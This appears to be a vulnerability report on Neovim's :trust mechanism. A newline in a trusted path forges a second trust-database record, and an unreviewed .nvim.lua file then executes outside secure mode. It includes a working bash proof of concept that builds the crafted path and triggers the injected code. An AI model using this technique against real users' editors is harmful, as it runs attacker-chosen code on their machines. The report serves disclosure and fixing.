# Newline-bearing trusted paths inject extra trust records and execute another exrc

## Broken invariant

One `:trust` / `vim.secure.trust()` approval must create exactly one trust-database record for exactly the canonical path the user approved.

Today that invariant is broken for canonical paths containing a literal newline. `vim.secure.trust()` stores the realpath as raw text with `string.format('%s %s\n', h, p)` (`runtime/lua/vim/secure.lua:79-88`), and `read_trust()` later reparses the database by splitting on raw `\n` and matching each line as `^(%S+) (.+)$` (`runtime/lua/vim/secure.lua:6-21`). A newline inside the trusted path therefore terminates the first record and starts a forged second record for a different path.

Because the C `:trust` bridge forwards the current buffer or explicit path straight into `vim.secure.trust()` (`src/nvim/lua/secure.c:45-114`), a user can follow the recommended "open the file, inspect it, then run `:trust`" flow and still end up trusting a second exrc file they never reviewed.

## Input -> normalization -> policy gate -> sink

1. **Input**: attacker controls a project path containing a newline. In the repro below, the trusted file lives at a path shaped like:

   ```text
   /tmp/.../evil\n<TARGET_HASH> /tmp/.../target/.nvim.lua
   ```

2. **Normalization**: `vim.secure.trust()` canonicalizes that buffer/path with `vim.uv.fs_realpath(vim.fs.normalize(...))` (`runtime/lua/vim/secure.lua:205-230`), preserving the embedded newline.

3. **Policy gate**: `write_trust()` persists the canonical path as raw text with no escaping (`runtime/lua/vim/secure.lua:79-88`). On the next read, `read_trust()` splits at the injected newline and accepts the attacker-controlled second line as a separate `<hash> <path>` record (`runtime/lua/vim/secure.lua:6-21`).

4. **Sink**: later, when `'exrc'` scans `.nvim.lua`, `.nvimrc`, and `.exrc`, `vim.secure.read(file)` canonicalizes the target path and now finds the forged hash record (`runtime/lua/vim/secure.lua:107-166`). `runtime/lua/vim/_core/exrc.lua` then executes the returned contents via `loadstring(... )()` or `nvim_exec2()` (`runtime/lua/vim/_core/exrc.lua:8-15`).

## Why this violates the documented contract

The docs say `:trust` marks the current buffer or file "as trusted, keyed on a hash of its contents" and that Nvim reuses that trust list across restarts (`runtime/doc/editing.txt:1721-1729`). They also tell users to avoid the TOCTOU risk of `:trust [file]` by viewing the file and running plain `:trust` (`runtime/doc/editing.txt:1726-1729`).

This bug breaks that promise even for the recommended safer flow: trusting the current buffer can silently create a second reusable trust record for a different canonical path.

## Minimal reproducer

Use a real TTY for the final startup. In this build, `--headless` skips the normal exrc startup path, so `script(1)` is the easiest way to drive the real sink non-interactively.

### Commands

```bash
NVIM=/home/node/.nix-profile/bin/nvim
base=$(mktemp -d /tmp/nvim-trust-final.XXXXXX)
state=$(mktemp -d /tmp/nvim-trust-final-state.XXXXXX)
config=$(mktemp -d /tmp/nvim-trust-final-config.XXXXXX)
data=$(mktemp -d /tmp/nvim-trust-final-data.XXXXXX)

mkdir -p "$base/target" "$state/nvim"
marker="$base/marker.txt"
target="$base/target/.nvim.lua"

# This is the file we never explicitly trust, but later get executed.
printf "vim.g.exploit_hit = 'YES'\nvim.fn.writefile({'pwned'}, '%s')\n" "$marker" > "$target"
target_hash=$(sha256sum "$target" | cut -d' ' -f1)

# Create a different file whose canonical path embeds a forged second trust record.
evil_component=$(printf 'evil\n%s ' "$target_hash")
malfile="$base/$evil_component/${target#/}"
mkdir -p "$(dirname "$malfile")"
printf "vim.g.injector = 'trusted'\n" > "$malfile"

# Trust only the malicious buffer.
XDG_STATE_HOME="$state" XDG_CONFIG_HOME="$config" XDG_DATA_HOME="$data" \
  "$NVIM" --headless --clean "$malfile" +trust +qall

# The trust DB now contains two logical records, even though only one file was trusted.
cat "$state/nvim/trust"

# Start fresh Nvim in the target directory with exrc enabled.
script -q -c "env -C '$base/target' \
  XDG_STATE_HOME='$state' XDG_CONFIG_HOME='$config' XDG_DATA_HOME='$data' \
  EXINIT='set exrc' \
  '$NVIM' +'lua print(vim.inspect({hit=vim.g.exploit_hit, secure=vim.o.secure, cwd=vim.fn.getcwd()}))' +qall" \
  /dev/null

test -f "$marker" && cat "$marker"
```

### Expected

- Trusting `"$malfile"` should create exactly one trust entry for that canonical path.
- The target `"$base/target/.nvim.lua"` was never trusted, so a fresh startup in `"$base/target"` should not execute it.

### Actual

- `cat "$state/nvim/trust"` shows **two** records after one trust action:

  ```text
  <malicious-file-hash> /tmp/.../evil
  <target-hash> /tmp/.../target/.nvim.lua
  ```

  The second line is forged from the newline-bearing realpath, not from a second approval.

- The fresh startup prints that the target exrc ran outside secure mode:

  ```text
  {
    cwd = "/tmp/.../target",
    hit = "YES",
    secure = false
  }
  ```

- `cat "$marker"` prints:

  ```text
  pwned
  ```

That proves the unreviewed target `.nvim.lua` reached the actual exrc execution sink.

## Affected files

- `runtime/lua/vim/secure.lua:6-21` — reparses the trust DB by splitting on raw newlines and treating each line as an independent record.
- `runtime/lua/vim/secure.lua:79-88` — serializes trust records as raw `<hash> <path>\n` with no escaping or length framing.
- `runtime/lua/vim/secure.lua:107-166` — `vim.secure.read()` authorizes the forged target record and returns executable contents.
- `runtime/lua/vim/secure.lua:191-239` — `vim.secure.trust()` canonicalizes newline-bearing paths and persists them unsafely.
- `src/nvim/lua/secure.c:45-114` — `:trust` / `:trust ++deny` / `:trust ++remove` bridge directly into the vulnerable Lua serializer.
- `runtime/lua/vim/_core/exrc.lua:8-15` — trusted contents flow into `loadstring()` or `nvim_exec2()`.
- `runtime/doc/editing.txt:1721-1729` — documented trust contract and the recommended plain-`:trust` flow that this bug violates.
- `runtime/doc/lua.txt:4669-4710` — API-level contract for `vim.secure.read()` and `vim.secure.trust()`.

## Impact / severity

This is a trust-boundary break in the policy layer that is supposed to decide which local code may run at all.

An attacker who can place a victim inside a newline-bearing project path can trick a single explicit trust action on one file into silently approving a second exrc path with attacker-chosen contents hash. On the next startup in that target directory, Nvim executes the forged file with `secure = false`.

I would rate this as **medium severity overall, high severity within the `'exrc'` feature boundary**:

- it requires opt-in use of `'exrc'` and a user trust action,
- but once those preconditions are met, it defeats the core "trust exactly the file I reviewed" guarantee,
- creates persistent cross-path trust entries,
- and reaches direct code-execution sinks in normal startup.
